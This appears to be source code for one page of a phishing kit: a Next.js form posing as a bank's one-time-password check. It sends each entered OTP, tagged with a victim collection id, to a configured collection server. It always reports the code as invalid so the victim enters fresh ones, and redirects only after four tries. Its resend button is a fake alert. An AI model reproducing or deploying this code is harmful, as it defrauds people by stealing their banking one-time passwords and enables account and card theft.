'use client';
import CountdownTimer from "../inlcude/Countdowntimer";
import DateInputComponent from "../inlcude/DateInputComponent";
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
    import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  
import { useState } from 'react';

export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;

    const [loading, setLoading] = useState(false);
    const [error, setError] = useState("");
    const [countOTT, setCountOTT] = useState(1);
    

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true); // Set loading state to true

        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem("collection_id");
        
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            setCountOTT(countOTT+1);
            
            console.log(countOTT, "counting");
            if(responseData.status==200){
                if(countOTT == 4){
                  router.push('/end');
              }else{
                e.target.reset();
                  setError("invalid otp entered...");
                  setTimeout(function(){setError("")},3000);
              }
            }else{
              alert("site not found");
            } 
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        } finally{
            setLoading(false); 
        }
    };
  return (
    <>
    <Header />
    <main>
    <div className="All_titlec__cGUYa">
        <h1 className="All_h1__PWkY3">ONE TIME PASSWORD VERIFICATION</h1>
    </div>
    <form className="All_myfrm__3vXyb" onSubmit={handleSubmit} id="frm_2_am8E_">
  <h1
    className="All_h1__PWkY3"
    style={{ color: "#114986", textAlign: "left!important" }}
  >
    Enter the one time password sent to your phone
  </h1>
  <p className="All_mndt__6QZEJ">Required Fileds are asterisk (*)</p>
  <div className="All_frm__am8E_">
    <div className="All_frmgrp__Ym9Kf">
      <label className="All_frmlb__P0GlO">
        One Time Password<span className="All_mndt__6QZEJ">*</span>
      </label>
      <input
        type="password"
        name="one"
        className="All_frmin__xQNbS"
        required
      />
      <div id="tok-invalid" style={{ color: "red", fontSize: "small" }}>
        {error ? error:''}
      </div>
    </div>
    <div className="All_ctr__36AKZ">
        <button type="submit" className="All_bts__Ls5Mq" disabled={loading}>
                {loading ? 'Please wait...' : 'Submit'}
            </button>
    </div>
    <div id="time" style={{ textAlign: "center", marginTop: 20 }}>
      <CountdownTimer />
    </div>
    <p>
      if you did not receive One Time Password on SMS, you can{" "}
      <span
        onClick={()=>{alert('otp sent successfully !')}}
        className="All_bts__Ls5Mq"
        style={{ backgroundColor: "green" }}
      >
        Click here to resend
      </span>{" "}
    </p>
  </div>
</form>

    </main>
    <Footer />
</>
  );
}
